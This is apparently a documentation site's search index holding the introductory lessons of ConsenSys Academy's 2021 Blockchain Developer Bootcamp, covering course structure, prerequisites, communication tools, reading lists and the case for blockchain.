{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"S00-intro/L1-course-intro/","text":"Welcome! Hello and welcome to ConsenSys Academy\u2019s 2021 Blockchain Developer Bootcamp, where you will learn everything you need to know to become a world-class blockchain developer. The blockchain field develops at an incredibly fast pace. This course will give you a solid foundation of blockchain principles. It will also introduce you to the tools used to build blockchain projects today. It can be overwhelming to enter such a rapidly developing field and we hope to give you the mental model to incorporate new information as it comes in. This cohort will launch on September 1st, 2021. You're in good company! Developers from all over the world will be your classmates, and this course is lead by some of the best in the business. The course features presentations from builders, developers, and entrepreneurs in the space. We want to share the ConsenSys network with you. Course content In this course, we start off by teaching you about the underpinnings of the blockchain and show how it all comes together to allow us to build the next generation of web applications. We will start with an overview of what we call blockchain primitives: The technology brought together underneath the name blockchain. We'll then dive deeper into the specifics of the Ethereum protocol and learn how those blockchain primitives show up there. Next, we'll move on to understanding how to write smart contracts. We introduce you to Solidity, a programming language for Smart Contracts that lets you interact with the Ethereum Virtual Machine. We'll learn about Truffle so you can try out your new Solidity skills! We'll also discuss smart contract design patterns and security for your smart contracts. After that, we'll introduce you to developer tooling, including Web3 libraries, and other development frameworks. Next, we'll discuss the way in which people are innovating blockchain development, with an introduction to Decentralized Finance (DeFi) and Decentralized Autonomous Organizations (DAOs). While this material may seem a bit overwhelming, it's important to have it available to you as you continue to develop in the space. You can always come back later to reread stuff. And we won't be testing you on it! Next, we'll touch on scalability: What it is, why it's necessary, and how some folks are proposing we approach it. We'll have a few tutorials allowing you to setup your own development environment for working on some of these scalability solutions. Last, we'll cover Ethereum 2.0, the upgrading of the Ethereum consensus mechanism from Proof of Work to Proof of Stake. We'll touch on some of the key terms and the current roadmap. As this course is self-paced, you can feel free to jump around between lessons. The earlier modules have more video and provide more of an overview of the relevant technology, while later modules get technical and have more hands on coding exercises and walk-throughs. Most modules have graded quizzes at the end of the module. Live Presentations Throughout the course, you'll see that some of the lessons are \"Live Presentations,\" these are demonstrations and walkthroughs of the concepts we're learning in the course. They will be hosted by wide cast of characters, including Academy staff, ConsenSys engineers, and developers working in the space. To help us pick the best time for these sessions, along with the weekly Office Hours and study sessions we hope to setup, please fill out this survey to let us know the best time for you to meet. So without further ado, we wish you the best of luck, and let\u2019s get started!","title":"Welcome!"},{"location":"S00-intro/L1-course-intro/#welcome","text":"Hello and welcome to ConsenSys Academy\u2019s 2021 Blockchain Developer Bootcamp, where you will learn everything you need to know to become a world-class blockchain developer. The blockchain field develops at an incredibly fast pace. This course will give you a solid foundation of blockchain principles. It will also introduce you to the tools used to build blockchain projects today. It can be overwhelming to enter such a rapidly developing field and we hope to give you the mental model to incorporate new information as it comes in. This cohort will launch on September 1st, 2021. You're in good company! Developers from all over the world will be your classmates, and this course is lead by some of the best in the business. The course features presentations from builders, developers, and entrepreneurs in the space. We want to share the ConsenSys network with you.","title":"Welcome!"},{"location":"S00-intro/L1-course-intro/#course-content","text":"In this course, we start off by teaching you about the underpinnings of the blockchain and show how it all comes together to allow us to build the next generation of web applications. We will start with an overview of what we call blockchain primitives: The technology brought together underneath the name blockchain. We'll then dive deeper into the specifics of the Ethereum protocol and learn how those blockchain primitives show up there. Next, we'll move on to understanding how to write smart contracts. We introduce you to Solidity, a programming language for Smart Contracts that lets you interact with the Ethereum Virtual Machine. We'll learn about Truffle so you can try out your new Solidity skills! We'll also discuss smart contract design patterns and security for your smart contracts. After that, we'll introduce you to developer tooling, including Web3 libraries, and other development frameworks. Next, we'll discuss the way in which people are innovating blockchain development, with an introduction to Decentralized Finance (DeFi) and Decentralized Autonomous Organizations (DAOs). While this material may seem a bit overwhelming, it's important to have it available to you as you continue to develop in the space. You can always come back later to reread stuff. And we won't be testing you on it! Next, we'll touch on scalability: What it is, why it's necessary, and how some folks are proposing we approach it. We'll have a few tutorials allowing you to setup your own development environment for working on some of these scalability solutions. Last, we'll cover Ethereum 2.0, the upgrading of the Ethereum consensus mechanism from Proof of Work to Proof of Stake. We'll touch on some of the key terms and the current roadmap. As this course is self-paced, you can feel free to jump around between lessons. The earlier modules have more video and provide more of an overview of the relevant technology, while later modules get technical and have more hands on coding exercises and walk-throughs. Most modules have graded quizzes at the end of the module.","title":"Course content"},{"location":"S00-intro/L1-course-intro/#live-presentations","text":"Throughout the course, you'll see that some of the lessons are \"Live Presentations,\" these are demonstrations and walkthroughs of the concepts we're learning in the course. They will be hosted by wide cast of characters, including Academy staff, ConsenSys engineers, and developers working in the space. To help us pick the best time for these sessions, along with the weekly Office Hours and study sessions we hope to setup, please fill out this survey to let us know the best time for you to meet. So without further ado, we wish you the best of luck, and let\u2019s get started!","title":"Live Presentations"},{"location":"S00-intro/L2-why-learn/","text":"Why Learn Blockchain? Most people in crypto came here initially because of the allure of money. Either we missed an opportunity to buy, are looking for an opportunity to grow our salary, or see an opportunity for a killer app. There's no shame in that! We do hope you come for the money and stay for the paradigm shift, though. Blockchain promises to upend the current top-down information systems in our world. Currently, most users of the internet surrender their personal data to centralized databases and services. To achieve this paradigm shift, blockchain relies fundamentally on two fields of computer science: Distributed Computing and Cryptography . We will cover these topics in the first section of the course. This paradigm shift requires changes from the developer and the user. In the next section of the course, we'll go over what the protocol-layer changes of blockchain mean for you as a developer. We'll then introduce you to Solidity, the language for developing smart contracts, as well as the tools you'll need to build. We'll also discuss the changes for the user, including how requiring private key signatures dramatically changes user workflow. While there's enormous promise with blockchain development, it requires an awareness of the paradigm shift and an expertise in the fundamental concepts underpinning it. Otherwise, we are inevitably going to recreate the same, centralized monolith we have today. External Resources Things That Matter Outside DeFi (Vitalik Buterin) Y Combinator: Building for the Blockchain (2017) Dated but interesting! Why It's Hard to \"Get\" Bitcoin: The Blockchain Spectrum The Promise of Blockchain: Vinay Gupta Cryptocurrencies (Last Week Tonight)","title":"Why Learn Blockchain?"},{"location":"S00-intro/L2-why-learn/#why-learn-blockchain","text":"Most people in crypto came here initially because of the allure of money. Either we missed an opportunity to buy, are looking for an opportunity to grow our salary, or see an opportunity for a killer app. There's no shame in that! We do hope you come for the money and stay for the paradigm shift, though. Blockchain promises to upend the current top-down information systems in our world. Currently, most users of the internet surrender their personal data to centralized databases and services. To achieve this paradigm shift, blockchain relies fundamentally on two fields of computer science: Distributed Computing and Cryptography . We will cover these topics in the first section of the course. This paradigm shift requires changes from the developer and the user. In the next section of the course, we'll go over what the protocol-layer changes of blockchain mean for you as a developer. We'll then introduce you to Solidity, the language for developing smart contracts, as well as the tools you'll need to build. We'll also discuss the changes for the user, including how requiring private key signatures dramatically changes user workflow. While there's enormous promise with blockchain development, it requires an awareness of the paradigm shift and an expertise in the fundamental concepts underpinning it. Otherwise, we are inevitably going to recreate the same, centralized monolith we have today.","title":"Why Learn Blockchain?"},{"location":"S00-intro/L2-why-learn/#external-resources","text":"Things That Matter Outside DeFi (Vitalik Buterin) Y Combinator: Building for the Blockchain (2017) Dated but interesting! Why It's Hard to \"Get\" Bitcoin: The Blockchain Spectrum The Promise of Blockchain: Vinay Gupta Cryptocurrencies (Last Week Tonight)","title":"External Resources"},{"location":"S00-intro/L3-course-tips/","text":"How to be Successful in this Course Make Sure to Take Basic Training We built a course called \"Before the Bootcamp: Basic Training,\" which will help you start off the course on the best foot. We've included all the things we believe make successful students for the Bootcamp. It's a prerequisite for the course! Growth Mindset Taking an online, self-paced course is a difficult task and requires a certain mindset in order be successful. First and foremost, foster a growth mindset and take full advantage of the course. Understanding takes time. There will be struggles and frustration when learning something new, especially something as difficult as blockchain development. Fortunately, enrolling in a continuing education course such as this indicates that you already exhibit a growth mindset. Here is a short video that shows the differences and talks about how you can demonstrate a growth mindset throughout this course. Ask All the Questions There is a common myth about the \"all-knowing\" developer who never needs to ask any questions. This person simply does not exist. Developers of all skill-levels need to ask questions! All developers use a search engine to find what they need. Do not hesitate to do these things! As you're going through the course, we recommend you take some time to write down a question about something you learned. Then, take time during the next week to answer that question. On the following Friday, make sure you've answered your question(s) and write another. Give Yourself Time to Understand It\u2019s impossible to learn these concepts by hearing them once. Instead, you\u2019ll hear concepts multiple times and begin to learn more each time around. Maybe you\u2019ll start programming and it makes some more sense. Finally, you\u2019ll try to explain it to someone and realize there\u2019s a part you don\u2019t understand, which you then have to go back and learn. This is the process of learning blockchain, and if you can accept it, it will take the pressure off trying to perfectly understand something the first time you hear it. Instead, try to let it wash over you, ask questions when they come up, but we\u2019re also going to dunk you into the unknown, pull you up to catch your breath, then do it again! Always keep in mind, if you find yourself truly stuck and need assistance, post a question into the relevant course chat and someone will be sure to assist. We are all here to learn and grow.","title":"How to be Successful in this Course"},{"location":"S00-intro/L3-course-tips/#how-to-be-successful-in-this-course","text":"","title":"How to be Successful in this Course"},{"location":"S00-intro/L3-course-tips/#make-sure-to-take-basic-training","text":"We built a course called \"Before the Bootcamp: Basic Training,\" which will help you start off the course on the best foot. We've included all the things we believe make successful students for the Bootcamp. It's a prerequisite for the course!","title":"Make Sure to Take Basic Training"},{"location":"S00-intro/L3-course-tips/#growth-mindset","text":"Taking an online, self-paced course is a difficult task and requires a certain mindset in order be successful. First and foremost, foster a growth mindset and take full advantage of the course. Understanding takes time. There will be struggles and frustration when learning something new, especially something as difficult as blockchain development. Fortunately, enrolling in a continuing education course such as this indicates that you already exhibit a growth mindset. Here is a short video that shows the differences and talks about how you can demonstrate a growth mindset throughout this course.","title":"Growth Mindset"},{"location":"S00-intro/L3-course-tips/#ask-all-the-questions","text":"There is a common myth about the \"all-knowing\" developer who never needs to ask any questions. This person simply does not exist. Developers of all skill-levels need to ask questions! All developers use a search engine to find what they need. Do not hesitate to do these things! As you're going through the course, we recommend you take some time to write down a question about something you learned. Then, take time during the next week to answer that question. On the following Friday, make sure you've answered your question(s) and write another.","title":"Ask All the Questions"},{"location":"S00-intro/L3-course-tips/#give-yourself-time-to-understand","text":"It\u2019s impossible to learn these concepts by hearing them once. Instead, you\u2019ll hear concepts multiple times and begin to learn more each time around. Maybe you\u2019ll start programming and it makes some more sense. Finally, you\u2019ll try to explain it to someone and realize there\u2019s a part you don\u2019t understand, which you then have to go back and learn. This is the process of learning blockchain, and if you can accept it, it will take the pressure off trying to perfectly understand something the first time you hear it. Instead, try to let it wash over you, ask questions when they come up, but we\u2019re also going to dunk you into the unknown, pull you up to catch your breath, then do it again! Always keep in mind, if you find yourself truly stuck and need assistance, post a question into the relevant course chat and someone will be sure to assist. We are all here to learn and grow.","title":"Give Yourself Time to Understand"},{"location":"S00-intro/L4-technical-requirements/","text":"Technical Requirements This course assumes a baseline of technical knowledge. It is important to make sure you are comfortable with the following tech. If you are not, we are providing links to excellent resources you can use to get up to speed! Please note that you can learn all these things in our free Basic Training course. Unix / Linux Environment Command Line Git JavaScript Code Editor Unix or Linux Environments To be successful in this course you must have access to a Unix or Linux based operating system. MacOS is based on Unix and if you're running Ubuntu, that's a Linux distribution. If you are on a Windows 10 machine, follow this guide to installing a Linux environment before starting the course. If you'd like to get more familiar with a Linux environment, you can check out this Ubuntu for beginners, targeting Ethereum Developers specifically: Ubuntu for Beginners (Those interested in learning more about the history of Unix can read this excerpt from Advanced Programming in Unix Environment by Stevens and Rago) Command Line The command line is the basic non-graphic interface for your computer. It is most commonly called the terminal or the shell . To be successful in this course, you should be comfortable using the command line. Among other things, you should be very comfortable changing directories using cd , deleting files with rm , installing files with curl , and running programs from the command line. We would also recommend becoming familiar with command line shortcuts, such as: CTRL + C Interrupts and quits the process currently running. Crucial in stopping terminal line programs CTRL + A Moves your cursor to the beginning of the line CTRL + E Moves your cursor to the end of the line Sometimes it's helpful to remap your caps lock key to become CTRL. Find out how to do that here. To brush up on command line skills, check out: MIT: Your Missing CS Semester: The Shell and Shell Tools The Odin Project: Command Line Basics Ubuntu for Beginners Git Git is a version-control system (VCS) used to track changes made to projects. While git seems simple, it's actually a bit challenging to get comfortable with. (Note that git is a piece of software, on which version control sites like GitHub or GitLab are based.) Here are some resources to get you started: Git: Docs The Odin Project: Setting Up Git The Odin Project: Git Basics MIT Missing CS Semester: Version Control (git) Git and GitHub for Poets (video) Not only is git a part of a good coding repertoire, it's also used by many open-source projects. An essential part of the bootcamp is contributing to open-source projects. It's really important to know how to do proper Pull Requests and other guidelines for contributing to open-source. Here are a few resources to help you with this: GitHub Pull Request Tutorial On undoing, fixing, or removing commits in git How to Teach Git For those who would like to get a headstart, check out the \"Good First Issues\" for these open-source Ethereum projects: MetaMask Truffle Go Ethereum (geth) Web3.js Prysmatic Labs or Teku (Ethereum 2.0 client) Be sure to read Community Guidelines before contributing to a project. For example, here is Geth's Contributor Guidelines and their Code Review Guidelines JavaScript Even if JavaScript is not your first software language, it's really important you be familiar with its basic syntax. Solidity, the smart contract language you'll learn, is based on ECMAScript. We recommend Code Academy's free Intro to JavaScript course, The Odin Project or The Modern JavaScript Tutorial to get the basics. Beyond basic JavaScript, students should be familiar with Node and npm. Some advanced students will also be using React in this course. Here are some resources to help familiarize yourself with these: The Odin Project: Introduction to Node JavaScript Fundamentals Before Learning React Code Editor VSCode is a very popular editor with developers due to the plug-ins and extensions it makes available. We would recommend getting started with it and the following plug-ins / features: Live Server which allows you to easily start a server in the directory Live Share an easy way to share your code with someone for pair programming Gitlens \"supercharges the Git capabilities built into Visual Studio Code.\" Solidity Visual Developer Built by ConsenSys! Solidity linter Checks valid Solidity syntax. Fair warning, can be over-opinionated for folks! Solidity Solhint Partial Diff Compare (diff) text selections within a file, across files, or to the clipboard Markdown All in One All you need to write Markdown GitHub Linker Create links to fragments of code in GitHub We strongly recommend using VSCode in this course, particularly if you're new to coding, due to its extensive plugins. Other popular editors include Atom, Sublime Text, and IDEA (written originally for Java but now supports many languages). There is also the option of text-only editors. Many developers find them extremely productive and, while challenging to learn, make their job much easier. We'll address one here, vim, by providing this series of tutorials: History and Effective Use of Vim Vim for Beginners Vim for Intermediate Users Vim for Advanced Users If you'll be using text-only editors, or simply using the command line for your development environment, you'll want to get familiar with tmux : Getting Started with Tmux","title":"Technical Requirements"},{"location":"S00-intro/L4-technical-requirements/#technical-requirements","text":"This course assumes a baseline of technical knowledge. It is important to make sure you are comfortable with the following tech. If you are not, we are providing links to excellent resources you can use to get up to speed! Please note that you can learn all these things in our free Basic Training course. Unix / Linux Environment Command Line Git JavaScript Code Editor","title":"Technical Requirements"},{"location":"S00-intro/L4-technical-requirements/#unix-or-linux-environments","text":"To be successful in this course you must have access to a Unix or Linux based operating system. MacOS is based on Unix and if you're running Ubuntu, that's a Linux distribution. If you are on a Windows 10 machine, follow this guide to installing a Linux environment before starting the course. If you'd like to get more familiar with a Linux environment, you can check out this Ubuntu for beginners, targeting Ethereum Developers specifically: Ubuntu for Beginners (Those interested in learning more about the history of Unix can read this excerpt from Advanced Programming in Unix Environment by Stevens and Rago)","title":"Unix or Linux Environments"},{"location":"S00-intro/L4-technical-requirements/#command-line","text":"The command line is the basic non-graphic interface for your computer. It is most commonly called the terminal or the shell . To be successful in this course, you should be comfortable using the command line. Among other things, you should be very comfortable changing directories using cd , deleting files with rm , installing files with curl , and running programs from the command line. We would also recommend becoming familiar with command line shortcuts, such as: CTRL + C Interrupts and quits the process currently running. Crucial in stopping terminal line programs CTRL + A Moves your cursor to the beginning of the line CTRL + E Moves your cursor to the end of the line Sometimes it's helpful to remap your caps lock key to become CTRL. Find out how to do that here. To brush up on command line skills, check out: MIT: Your Missing CS Semester: The Shell and Shell Tools The Odin Project: Command Line Basics Ubuntu for Beginners","title":"Command Line"},{"location":"S00-intro/L4-technical-requirements/#git","text":"Git is a version-control system (VCS) used to track changes made to projects. While git seems simple, it's actually a bit challenging to get comfortable with. (Note that git is a piece of software, on which version control sites like GitHub or GitLab are based.) Here are some resources to get you started: Git: Docs The Odin Project: Setting Up Git The Odin Project: Git Basics MIT Missing CS Semester: Version Control (git) Git and GitHub for Poets (video) Not only is git a part of a good coding repertoire, it's also used by many open-source projects. An essential part of the bootcamp is contributing to open-source projects. It's really important to know how to do proper Pull Requests and other guidelines for contributing to open-source. Here are a few resources to help you with this: GitHub Pull Request Tutorial On undoing, fixing, or removing commits in git How to Teach Git For those who would like to get a headstart, check out the \"Good First Issues\" for these open-source Ethereum projects: MetaMask Truffle Go Ethereum (geth) Web3.js Prysmatic Labs or Teku (Ethereum 2.0 client) Be sure to read Community Guidelines before contributing to a project. For example, here is Geth's Contributor Guidelines and their Code Review Guidelines","title":"Git"},{"location":"S00-intro/L4-technical-requirements/#javascript","text":"Even if JavaScript is not your first software language, it's really important you be familiar with its basic syntax. Solidity, the smart contract language you'll learn, is based on ECMAScript. We recommend Code Academy's free Intro to JavaScript course, The Odin Project or The Modern JavaScript Tutorial to get the basics. Beyond basic JavaScript, students should be familiar with Node and npm. Some advanced students will also be using React in this course. Here are some resources to help familiarize yourself with these: The Odin Project: Introduction to Node JavaScript Fundamentals Before Learning React","title":"JavaScript"},{"location":"S00-intro/L4-technical-requirements/#code-editor","text":"VSCode is a very popular editor with developers due to the plug-ins and extensions it makes available. We would recommend getting started with it and the following plug-ins / features: Live Server which allows you to easily start a server in the directory Live Share an easy way to share your code with someone for pair programming Gitlens \"supercharges the Git capabilities built into Visual Studio Code.\" Solidity Visual Developer Built by ConsenSys! Solidity linter Checks valid Solidity syntax. Fair warning, can be over-opinionated for folks! Solidity Solhint Partial Diff Compare (diff) text selections within a file, across files, or to the clipboard Markdown All in One All you need to write Markdown GitHub Linker Create links to fragments of code in GitHub We strongly recommend using VSCode in this course, particularly if you're new to coding, due to its extensive plugins. Other popular editors include Atom, Sublime Text, and IDEA (written originally for Java but now supports many languages). There is also the option of text-only editors. Many developers find them extremely productive and, while challenging to learn, make their job much easier. We'll address one here, vim, by providing this series of tutorials: History and Effective Use of Vim Vim for Beginners Vim for Intermediate Users Vim for Advanced Users If you'll be using text-only editors, or simply using the command line for your development environment, you'll want to get familiar with tmux : Getting Started with Tmux","title":"Code Editor"},{"location":"S00-intro/L5-communication-tools/","text":"Communication Tools Discord Students have access to a chat app called Discord. Here is the link to join the ConsenSys Discord channel. We have a channel specific for Bootcamp students and alumni, but there are also channels for you to talk with other developers, product owners, and those interested in the Ethereum ecosystem. As the course progresses, you may want to ask a specific ConsenSys team questions about their specific product. You can do that in this Discord server. Getting to the Bootcamp Discord Section In the ConsenSys Discord ( invite here ), go to the Academy channel. There, find the \"\ud83c\udf31-bootcamp-welcome-desk-\ud83c\udf31\" and type in the command !role . You find a window pop up, and you'll select the lightbulb emoji \ud83d\udca1. After that, you'll see the Bootcamp section! Don't hesitate to ask for help. We'll have admins be watching throughout the first week to help people get to the Bootcamp section! Zoom We will be using Zoom for Office Hours and One-on-One meetings. You can download Zoom here. Office Hours Attending office hours is a great way to get to know the course mentors and your fellow students. Office hours are for asking questions about the course, discussing anything related Ethereum (news, tools, tweets, blog posts, projects ideas, the future, etc.) and learning about ConsenSys projects (when they come to present). We will make announcements about when ConsenSys projects will come to present during the course. Check out the Blockchain Developer Bootcamp Google calendar here. You can also add it to your own calendar!","title":"Communication Tools"},{"location":"S00-intro/L5-communication-tools/#communication-tools","text":"","title":"Communication Tools"},{"location":"S00-intro/L5-communication-tools/#discord","text":"Students have access to a chat app called Discord. Here is the link to join the ConsenSys Discord channel. We have a channel specific for Bootcamp students and alumni, but there are also channels for you to talk with other developers, product owners, and those interested in the Ethereum ecosystem. As the course progresses, you may want to ask a specific ConsenSys team questions about their specific product. You can do that in this Discord server.","title":"Discord"},{"location":"S00-intro/L5-communication-tools/#getting-to-the-bootcamp-discord-section","text":"In the ConsenSys Discord ( invite here ), go to the Academy channel. There, find the \"\ud83c\udf31-bootcamp-welcome-desk-\ud83c\udf31\" and type in the command !role . You find a window pop up, and you'll select the lightbulb emoji \ud83d\udca1. After that, you'll see the Bootcamp section! Don't hesitate to ask for help. We'll have admins be watching throughout the first week to help people get to the Bootcamp section!","title":"Getting to the Bootcamp Discord Section"},{"location":"S00-intro/L5-communication-tools/#zoom","text":"We will be using Zoom for Office Hours and One-on-One meetings. You can download Zoom here.","title":"Zoom"},{"location":"S00-intro/L5-communication-tools/#office-hours","text":"Attending office hours is a great way to get to know the course mentors and your fellow students. Office hours are for asking questions about the course, discussing anything related Ethereum (news, tools, tweets, blog posts, projects ideas, the future, etc.) and learning about ConsenSys projects (when they come to present). We will make announcements about when ConsenSys projects will come to present during the course. Check out the Blockchain Developer Bootcamp Google calendar here. You can also add it to your own calendar!","title":"Office Hours"},{"location":"S00-intro/L6-keeping-up/","text":"Keeping Up With Blockchain Development As we mentioned, the blockchain space moves very fast. Courses like this are great way to get you on the ride but you'll need to keep up with the pace. Luckily, there are plenty of places to read the latest and greatest happening in the space, particularly Ethereum. Here's where we suggest you get started. Have suggestions you'd like to see on the list? Edit this page here! Twitter Twitter Lists from Aftab Hossain (DCinvestor) @ConsensysAcad Twitter List from John Brennan @ConsenSys Basecamp's list of blockchain Cultural Figures Go through this list and follow them! Reddit r/Ethereum r/EthFinance r/EthStakers r/CryptoCurrency r/EthDev Newsletters Signal ConsenSys' Developer Newsletter Week In Ethereum A weekly round-up of all things Ethereum EthHub Another weekly news round-up Economics Design (detailed dives into DeFi and crypto topics) Decrypt the Web 3 news site has a newsletter you can sign up for which delivers top stories from the day Tally Great roundup of DAO governance votes DeFi Weekly Daily Gwei Websites The Ethereum Wiki Rekt Glassnode Insights The Defiant Decrypt Basecamp and Basecamp's Blue Chip Defi Docs and Audits Ethereum Stack Exchange Mirror.xyz Read about this interesting writing platform here The Daily Ape YouTube Finematics Critical way of learning about blockchain concepts! Bankless Peep an EIP Eat the Blocks Dapp University Patrick Collins Nader Dabit Dan Finlay on How Ethereum Works Coin Bureau Podcasts Zero Knowledge Unchained Epicenter Mapping out Eth 2 Bankless Uncommon Core Learning Paths EthernautDAO Decentralized organization focussed on training developers to become blockchain developers and get them jobs! Discord here How to Get Into Web 3 as a Developer (Nader Dabit) Anett Rolikova's README for Crypto Beginners Learning Resources from EthernautDAO DeFi Developer Roadmap Ethereum.org's Developer Guide BuidlGuidl Cleverflare Resources to Learn Web 3 Learn Blockchain, Solidity, and Full Stack Javascript Development How to Become a DeFi Developer Rabbithole.gg Place to learn and earn tokens Zapper Learn Educational resources around DeFi KERNEL Resources From Gitcoin's KERNEL incubator program Consensys' Ethereum Developer Tools List EthereumDev.io Comprehensive Solidity Tutorials CryptoZombies Visual Overview of Ethereum in 116 Slides QuestBook-Learn Solidity A Discord server for beginners in Solidity Chainshot Educational resources on Solidity UseWeb3 Mega-Aggregator of Ethereum educational resources, including courses, tutorials, newsletters","title":"Keeping Up With Blockchain Development"},{"location":"S00-intro/L6-keeping-up/#keeping-up-with-blockchain-development","text":"As we mentioned, the blockchain space moves very fast. Courses like this are great way to get you on the ride but you'll need to keep up with the pace. Luckily, there are plenty of places to read the latest and greatest happening in the space, particularly Ethereum. Here's where we suggest you get started. Have suggestions you'd like to see on the list? Edit this page here!","title":"Keeping Up With Blockchain Development"},{"location":"S00-intro/L6-keeping-up/#twitter","text":"Twitter Lists from Aftab Hossain (DCinvestor) @ConsensysAcad Twitter List from John Brennan @ConsenSys Basecamp's list of blockchain Cultural Figures Go through this list and follow them!","title":"Twitter"},{"location":"S00-intro/L6-keeping-up/#reddit","text":"r/Ethereum r/EthFinance r/EthStakers r/CryptoCurrency r/EthDev","title":"Reddit"},{"location":"S00-intro/L6-keeping-up/#newsletters","text":"Signal ConsenSys' Developer Newsletter Week In Ethereum A weekly round-up of all things Ethereum EthHub Another weekly news round-up Economics Design (detailed dives into DeFi and crypto topics) Decrypt the Web 3 news site has a newsletter you can sign up for which delivers top stories from the day Tally Great roundup of DAO governance votes DeFi Weekly Daily Gwei","title":"Newsletters"},{"location":"S00-intro/L6-keeping-up/#websites","text":"The Ethereum Wiki Rekt Glassnode Insights The Defiant Decrypt Basecamp and Basecamp's Blue Chip Defi Docs and Audits Ethereum Stack Exchange Mirror.xyz Read about this interesting writing platform here The Daily Ape","title":"Websites"},{"location":"S00-intro/L6-keeping-up/#youtube","text":"Finematics Critical way of learning about blockchain concepts! Bankless Peep an EIP Eat the Blocks Dapp University Patrick Collins Nader Dabit Dan Finlay on How Ethereum Works Coin Bureau","title":"YouTube"},{"location":"S00-intro/L6-keeping-up/#podcasts","text":"Zero Knowledge Unchained Epicenter Mapping out Eth 2 Bankless Uncommon Core","title":"Podcasts"},{"location":"S00-intro/L6-keeping-up/#learning-paths","text":"EthernautDAO Decentralized organization focussed on training developers to become blockchain developers and get them jobs! Discord here How to Get Into Web 3 as a Developer (Nader Dabit) Anett Rolikova's README for Crypto Beginners Learning Resources from EthernautDAO DeFi Developer Roadmap Ethereum.org's Developer Guide BuidlGuidl Cleverflare Resources to Learn Web 3 Learn Blockchain, Solidity, and Full Stack Javascript Development How to Become a DeFi Developer Rabbithole.gg Place to learn and earn tokens Zapper Learn Educational resources around DeFi KERNEL Resources From Gitcoin's KERNEL incubator program Consensys' Ethereum Developer Tools List EthereumDev.io Comprehensive Solidity Tutorials CryptoZombies Visual Overview of Ethereum in 116 Slides QuestBook-Learn Solidity A Discord server for beginners in Solidity Chainshot Educational resources on Solidity UseWeb3 Mega-Aggregator of Ethereum educational resources, including courses, tutorials, newsletters","title":"Learning Paths"},{"location":"S00-intro/L7-advanced-students/","text":"Advanced Users Some students may find themselves moving through the material faster than others. If that's you and you'd like more advanced work you can pursue on the side, here's what we recommend: Write a Blog Post for ConsenSys We are always looking for content on new and exciting topics in the space. Reach out to the instructors with any ideas you have or if you'd like some suggestions. It's easier than you think! Contribute to the \"How'd They Build That?\" Series We're starting a series breaking down some of the more popular smart-contract based applications as a resource for other students. The idea would be to explain how the different parts piece together to form the product. First on the list are MakerDao, Yearn Finance, Uniswap, Compound and Curve Finance. We're also open to suggestions! Find a repo and start on a Good First Issue MetaMask, Truffle, Go Ethereum (geth), Web3.js, Prysmatic Labs, Teku, Quilt (ConsenSys R&D), or Hyperledger Besu . Suggest new modules or features for this course We're always looking to improve this course. If you feel as though something is missing, please let us know! Fill out an issue on our repo and label it as \"Request for Material.\"","title":"Advanced Users"},{"location":"S00-intro/L7-advanced-students/#advanced-users","text":"Some students may find themselves moving through the material faster than others. If that's you and you'd like more advanced work you can pursue on the side, here's what we recommend: Write a Blog Post for ConsenSys We are always looking for content on new and exciting topics in the space. Reach out to the instructors with any ideas you have or if you'd like some suggestions. It's easier than you think! Contribute to the \"How'd They Build That?\" Series We're starting a series breaking down some of the more popular smart-contract based applications as a resource for other students. The idea would be to explain how the different parts piece together to form the product. First on the list are MakerDao, Yearn Finance, Uniswap, Compound and Curve Finance. We're also open to suggestions! Find a repo and start on a Good First Issue MetaMask, Truffle, Go Ethereum (geth), Web3.js, Prysmatic Labs, Teku, Quilt (ConsenSys R&D), or Hyperledger Besu . Suggest new modules or features for this course We're always looking to improve this course. If you feel as though something is missing, please let us know! Fill out an issue on our repo and label it as \"Request for Material.\"","title":"Advanced Users"},{"location":"S00-intro/L8-whats-exciting/","text":"This content is a video hosted on courses.consensys.net (for now)","title":"Index"},{"location":"S01-fundamentals/M0-intro/","text":"Fundamentals dusts hands Well, well...Looks like we finally made it to the course content! Took us long enough, eh? Despite the Bitcoin white paper being written in 2008, Bitcoin, and blockchain generally, should be seen as the continuation of decades of technological development. In this first section, Fundamentals, we'll learn what those developments are and how they combine to become what we call blockchain. This first section will lay the foundation for the rest of this course but we hope it will also broaden your understanding of computer programming, security and networking. The cryptographic and distributed computing tools you'll learn in this section are used in every facet of digital life. Online banking, communication networks, cloud providers, aerospace engineering and many more fields pull from similar starting points. By learning them here, you'll better your understanding of those systems, too. The Argument for Blockchain The Current State of Affairs In our financial transactions, we always use an intermediary, be it a bank or a credit card company. We use these institutions because they have cultivated and embodied in society our values of trust, security, and accessibility (You can call someone if you have a problem, there\u2019s a central website, for example) What's the Problem? However, in recent years, those values have been violated in different ways (financial crashes, data breaches, or monopolization leading to poor customer service), which has led people to question whether there's a different way these processes can be done . At the same time, there's been an unprecedented amount of digitalization that has also occurred in all parts of our life, but also finance\u2013 it's not unusual to cash a check by phone, or pay off a credit card or utility bill by computer. What's the Proposed Solution? Significant system failures and increased digitalization led blockchain developers to consider alternatives to centralized financial institutions. Specifically, they looked to develop a protocol for financial transactions. A protocol is the reason why, when you dial a phone number, there's not an operator on the other end connecting your line to another. Or, when you type in a web address, you don't first leave your house to get that data. These are protocols that have been developed which have eliminated intermediate, human-mediated steps. This is the value proposition of blockchain. A peer-to-peer protocol which allows people to interact directly with each other, rather than going through a third party. People are so excited about blockchain because it aims to make important transactions (financial transactions or identity confirmation) peer-to-peer, removing the need for a middle player. Services such as Twilio have automated text message and receiving by allowing programmers to simply import the Twilio library into their program and, presto! They can send and receive text messages. Blockchain protocols such as Ethereum can be seen in a similar light \u2013 import Ethereum libraries (such as web3.js) and you can begin programmatically sending and receiving money. Setting up a bank account takes weeks, but with Ethereum, you can setup accounts, transfer funds and much more all from within your program. The Ethereum protocol is strong enough to sustain financial transactions, but it can also support much more. You can use the distributed network to host self-executing programs. You can build decentralized systems of reputation, you can also persist global state in a secure, trustless way. All of these things are possible within the world of Ethereum. What Makes Up a Protocol? In the following modules, we're going to examine the elements engineers have used to build the peer-to-peer blockchain protocol. We'll then see how systems like Bitcoin and Ethereum join these separate elements together to make a wholly new product: blockchain. Last, we'll talk about the development of Bitcoin and how you can start playing with the Ethereum blockchain right from your browser.","title":"Index"},{"location":"S01-fundamentals/M0-intro/#fundamentals","text":"dusts hands Well, well...Looks like we finally made it to the course content! Took us long enough, eh? Despite the Bitcoin white paper being written in 2008, Bitcoin, and blockchain generally, should be seen as the continuation of decades of technological development. In this first section, Fundamentals, we'll learn what those developments are and how they combine to become what we call blockchain. This first section will lay the foundation for the rest of this course but we hope it will also broaden your understanding of computer programming, security and networking. 